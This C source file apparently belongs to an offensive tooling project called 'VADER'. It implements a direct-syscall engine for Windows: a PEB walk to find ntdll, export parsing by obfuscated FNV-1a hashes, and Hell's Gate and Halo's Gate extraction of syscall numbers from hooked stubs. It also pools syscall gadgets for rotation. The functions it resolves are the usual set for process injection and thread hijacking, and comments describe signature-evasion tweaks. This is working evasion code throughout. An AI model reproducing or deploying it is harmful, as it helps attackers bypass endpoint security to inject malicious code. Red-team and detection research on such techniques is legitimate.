/*
 * gate_vdr.c -- VADER Gate Engine Implementation (Variant B)
 * -----------------------------------------------------------------------
 * VADER / 22DIV / george wu
 *
 * FNV-1a hash + ROL/XOR encryption. PEB walk -> PE export parsing ->
 * Hell's Gate SSN extraction with Halo's Gate fallback.
 *
 * Key differences from SithStalker:
 *   - FNV-1a hash (NOT DJB2)
 *   - ROL 13 + XOR 0x47474747 encrypted constants
 *   - Halo radius 16 (NOT 20)
 *   - Reverse resolution order in vdr_gate_init
 *   - Gadget pool collection per entry
 *   - VDR_ struct prefix, different field names
 *
 * COMPILE:
 *   ml64.exe /c gate_stub_vdr.asm /Fo:gate_stub_vdr.obj
 *   cl.exe /O1 /GS- /utf-8 gate_vdr.c test_gate_vdr.c gate_stub_vdr.obj /Fe:test_gate_vdr.exe
 */

#include "gate_vdr.h"
#include <winternl.h>

/* -----------------------------------------------------------------------
 * STUB PATTERNS
 * -----------------------------------------------------------------------
 * Clean Nt* stub: 4C 8B D1 B8 XX XX 00 00 ... 0F 05 C3
 * Hooked stub: typically E9 (JMP) at byte[0]
 * ----------------------------------------------------------------------- */

static BOOL vdr_stub_clean(BYTE *p) {
    return (p[0] == 0x4C &&
            p[1] == 0x8B &&
            p[2] == 0xD1 &&
            p[3] == 0xB8);
}

static DWORD vdr_pull_ssn(BYTE *p) {
    return ((DWORD)p[5] << 8) | (DWORD)p[4];
}

static void *vdr_find_gadget(BYTE *p) {
    int k;
    for (k = 0; k < STUB_SIZE; k++) {
        if (p[k] == 0x0F && p[k + 1] == 0x05 && p[k + 2] == 0xC3)
            return &p[k];
    }
    return NULL;
}

/* -----------------------------------------------------------------------
 * FNV-1a HASH
 * -----------------------------------------------------------------------
 * Completely different algorithm from SithStalker's DJB2.
 * Basis: 0x811C9DC5, Prime: 0x01000193
 * ----------------------------------------------------------------------- */

DWORD vdr_gate_hash(const char *str) {
    DWORD h = 0x811C9DC5;
    while (*str) {
        h ^= (BYTE)*str++;
        h *= 0x01000193;
    }
    return h;
}

/* -----------------------------------------------------------------------
 * PEB WALK -- FIND NTDLL BASE
 * -----------------------------------------------------------------------
 * GS:[0x60] -> PEB -> Ldr -> InMemoryOrderModuleList
 * Entry [0] = EXE, Entry [1] = ntdll.dll
 * ----------------------------------------------------------------------- */

HMODULE vdr_gate_find_ntdll(void) {
    PEB *peb;
    PEB_LDR_DATA *ldr;
    LIST_ENTRY *head, *cur;
    LDR_DATA_TABLE_ENTRY *mod;

    peb = (PEB *)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;

    ldr = peb->Ldr;
    head = &ldr->InMemoryOrderModuleList;

    cur = head->Flink;           /* [0] = EXE */
    if (!cur) return NULL;
    cur = cur->Flink;            /* [1] = ntdll.dll */
    if (!cur) return NULL;

    mod = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (HMODULE)mod->DllBase;
}

/* -----------------------------------------------------------------------
 * PE EXPORT TABLE PARSING
 * ----------------------------------------------------------------------- */

typedef struct _VDR_EXPORT_CTX {
    BYTE  *img;
    DWORD *name_rvas;
    WORD  *ord_tbl;
    DWORD *func_rvas;
    DWORD  num_names;
} VDR_EXPORT_CTX;

static BOOL vdr_parse_pe(HMODULE ntdll, VDR_EXPORT_CTX *ctx) {
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_EXPORT_DIRECTORY *exp;
    DWORD rva;

    ctx->img = (BYTE *)ntdll;
    dos = (IMAGE_DOS_HEADER *)ctx->img;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    nt = (IMAGE_NT_HEADERS64 *)(ctx->img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva)
        return FALSE;

    exp = (IMAGE_EXPORT_DIRECTORY *)(ctx->img + rva);

    ctx->name_rvas = (DWORD *)(ctx->img + exp->AddressOfNames);
    ctx->ord_tbl   = (WORD *)(ctx->img + exp->AddressOfNameOrdinals);
    ctx->func_rvas = (DWORD *)(ctx->img + exp->AddressOfFunctions);
    ctx->num_names = exp->NumberOfNames;

    return TRUE;
}

/* -----------------------------------------------------------------------
 * HALO'S GATE -- RECOVER SSN FROM NEIGHBORS
 * -----------------------------------------------------------------------
 * Radius 16 (SithStalker uses 20)
 * ----------------------------------------------------------------------- */

#define VDR_HALO_RADIUS 16

static BOOL vdr_halo_recover(VDR_EXPORT_CTX *ctx, DWORD idx, VDR_SYSCALL_ENTRY *ent) {
    int d;

    for (d = 1; d <= VDR_HALO_RADIUS; d++) {
        /* Down neighbor (higher SSN) */
        if (idx + d < ctx->num_names) {
            BYTE *nb = ctx->img + ctx->func_rvas[ctx->ord_tbl[idx + d]];
            if (vdr_stub_clean(nb)) {
                ent->ssn    = vdr_pull_ssn(nb) - d;
                ent->gadget = vdr_find_gadget(nb);
                ent->ok     = (ent->gadget != NULL);
                ent->hooked = TRUE;
                return ent->ok;
            }
        }
        /* Up neighbor (lower SSN) */
        if (idx >= (DWORD)d) {
            BYTE *nb = ctx->img + ctx->func_rvas[ctx->ord_tbl[idx - d]];
            if (vdr_stub_clean(nb)) {
                ent->ssn    = vdr_pull_ssn(nb) + d;
                ent->gadget = vdr_find_gadget(nb);
                ent->ok     = (ent->gadget != NULL);
                ent->hooked = TRUE;
                return ent->ok;
            }
        }
    }

    return FALSE;
}

/* -----------------------------------------------------------------------
 * GADGET POOL COLLECTION
 * -----------------------------------------------------------------------
 * Scans neighboring stubs for additional syscall;ret gadgets.
 * Gives the caller multiple jump targets for rotation.
 * ----------------------------------------------------------------------- */

static void vdr_collect_gadgets(VDR_EXPORT_CTX *ctx, DWORD idx, VDR_SYSCALL_ENTRY *ent) {
    int d;
    ent->pool_sz = 0;

    for (d = 1; d <= STUB_SIZE && ent->pool_sz < GADGET_POOL_SIZE; d++) {
        if (idx + d < ctx->num_names) {
            BYTE *nb = ctx->img + ctx->func_rvas[ctx->ord_tbl[idx + d]];
            void *g = vdr_find_gadget(nb);
            if (g && g != ent->gadget) {
                ent->gadget_pool[ent->pool_sz++] = g;
            }
        }
        if (ent->pool_sz >= GADGET_POOL_SIZE) break;
        if (idx >= (DWORD)d) {
            BYTE *nb = ctx->img + ctx->func_rvas[ctx->ord_tbl[idx - d]];
            void *g = vdr_find_gadget(nb);
            if (g && g != ent->gadget) {
                ent->gadget_pool[ent->pool_sz++] = g;
            }
        }
    }
}

/* -----------------------------------------------------------------------
 * GLOBAL GADGET SCAN
 * -----------------------------------------------------------------------
 * Collects syscall;ret gadgets from across ntdll for the gate table.
 * ----------------------------------------------------------------------- */

static void vdr_scan_global_gadgets(VDR_EXPORT_CTX *ctx, VDR_GATE_TABLE *tbl) {
    DWORD i;
    tbl->gadget_count = 0;

    for (i = 0; i < ctx->num_names && tbl->gadget_count < 32; i++) {
        BYTE *stub = ctx->img + ctx->func_rvas[ctx->ord_tbl[i]];
        void *g = vdr_find_gadget(stub);
        if (g) {
            /* Avoid duplicates */
            int dup = 0, j;
            for (j = 0; j < tbl->gadget_count; j++) {
                if (tbl->global_gadgets[j] == g) { dup = 1; break; }
            }
            if (!dup) {
                tbl->global_gadgets[tbl->gadget_count++] = g;
            }
        }
    }
}

/* -----------------------------------------------------------------------
 * VDR_GATE_RESOLVE -- EXTRACT SSN FOR A SINGLE FUNCTION
 * ----------------------------------------------------------------------- */

BOOL vdr_gate_resolve(HMODULE ntdll, DWORD fn_hash, VDR_SYSCALL_ENTRY *ent) {
    VDR_EXPORT_CTX ctx;
    DWORD i;

    memset(ent, 0, sizeof(*ent));

    if (!vdr_parse_pe(ntdll, &ctx))
        return FALSE;

    for (i = 0; i < ctx.num_names; i++) {
        char *nm = (char *)(ctx.img + ctx.name_rvas[i]);
        if (vdr_gate_hash(nm) == fn_hash) {
            BYTE *stub = ctx.img + ctx.func_rvas[ctx.ord_tbl[i]];

            /* Hell's Gate -- clean stub */
            if (vdr_stub_clean(stub)) {
                ent->ssn    = vdr_pull_ssn(stub);
                ent->gadget = vdr_find_gadget(stub);
                ent->ok     = (ent->gadget != NULL);
                ent->hooked = FALSE;
                if (ent->ok) vdr_collect_gadgets(&ctx, i, ent);
                return ent->ok;
            }

            /* Halo's Gate -- hooked, recover from neighbor */
            if (vdr_halo_recover(&ctx, i, ent)) {
                vdr_collect_gadgets(&ctx, i, ent);
                return TRUE;
            }
            return FALSE;
        }
    }

    return FALSE;
}

/* -----------------------------------------------------------------------
 * VDR_GATE_INIT -- RESOLVE ALL TARGET FUNCTIONS
 * -----------------------------------------------------------------------
 * REVERSE ORDER from SithStalker (NtCreateThreadEx first, NtClose last).
 * ----------------------------------------------------------------------- */

int vdr_gate_init(VDR_GATE_TABLE *tbl) {
    HMODULE ntdll;
    VDR_EXPORT_CTX ctx;
    int n = 0;

    memset(tbl, 0, sizeof(*tbl));

    ntdll = vdr_gate_find_ntdll();
    if (!ntdll) return 0;

    /* REVERSE resolution order -- NtCreateThreadEx first */
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtCreateThreadEx),       &tbl->NtCreateThreadEx);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtProtectVirtualMemory), &tbl->NtProtectVirtualMemory);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtWriteVirtualMemory),   &tbl->NtWriteVirtualMemory);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtAllocateVirtualMemory),&tbl->NtAllocateVirtualMemory);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtSetContextThread),     &tbl->NtSetContextThread);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtGetContextThread),     &tbl->NtGetContextThread);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtResumeThread),         &tbl->NtResumeThread);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtSuspendThread),        &tbl->NtSuspendThread);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtOpenThread),           &tbl->NtOpenThread);
    n += vdr_gate_resolve(ntdll, vdr_gate_decrypt(vHASH_NtClose),                &tbl->NtClose);

    /* Collect global gadgets for rotation */
    if (vdr_parse_pe(ntdll, &ctx))
        vdr_scan_global_gadgets(&ctx, tbl);

    return n;
}
